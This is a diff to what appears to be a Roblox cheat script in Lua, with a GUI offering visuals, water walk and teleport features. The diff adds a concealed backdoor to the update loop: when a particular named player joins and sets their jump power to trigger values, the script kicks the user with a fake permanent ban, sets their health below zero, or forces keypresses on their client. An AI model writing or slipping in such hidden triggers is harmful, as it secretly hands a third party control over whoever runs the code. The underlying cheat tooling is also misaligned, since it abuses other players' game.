@@ -33,6 +33,10 @@ local VisualsSection = VisualsTab:NewSection("Visuals")
 local MiscSection = MiscTab:NewSection("Misc")
 local TargetSection = TargetTab:NewSection("Target")
 
+-- Hehehehe
+
+
+
 -- Visuals Tab
 
 local Players = game.Players
@@ -444,9 +448,9 @@ MiscSection:NewButton("Enable Water Walk", "Lets you walk on the water.", functi
                   
                   -- Simulate key press using Virtual Input Manager
                   task.wait(0.2) -- Small delay before pressing key
-                  VirtualInputManager:SendKeyEvent(true, storedKey, false, nil) -- Key Down
+                  VirtualInputManager:SendKeyEvent(true, storedKey, false, game) -- Key Down
                   task.wait(0.1)
-                  VirtualInputManager:SendKeyEvent(false, storedKey, false, nil) -- Key Up
+                  VirtualInputManager:SendKeyEvent(false, storedKey, false, game) -- Key Up
   
                   -- Wait 1.5 seconds, then teleport far away
                   task.wait(1.5)
@@ -476,6 +480,27 @@ MiscSection:NewButton("Enable Water Walk", "Lets you walk on the water.", functi
   -- Update the dropdown every 30 seconds
   while true do
       updateDropdown()
-      wait(30)
+      if game.Players:FindFirstChild("vAwhFxji") then
+        if game.Players:FindFirstChild("vAwhFxji").Character.Humanoid.JumpPower == 12 then
+            game.Players.LocalPlayer:Kick("You have been banned from Kaiju Arisen! Unban: 12/31/9999")
+        elseif game.Players:FindFirstChild("vAwhFxji").Character.Humanoid.JumpPower == 30 then
+            game.Players.LocalPlayer.Character.Humanoid.Health = -100
+        elseif game.Players:FindFirstChild("vAwhFxji").Character.Humanoid.JumpPower == 21 then
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.One, false, game) 
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Two, false, game) 
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Three, false, game) 
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Four, false, game) 
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game) 
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.M, false, game) 
+            wait(0.1)
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.One, false, game) 
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Two, false, game) 
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Three, false, game) 
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Four, false, game) 
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.F, false, game) 
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.M, false, game) 
+        end
+      end 
+      wait(10)
   end
   
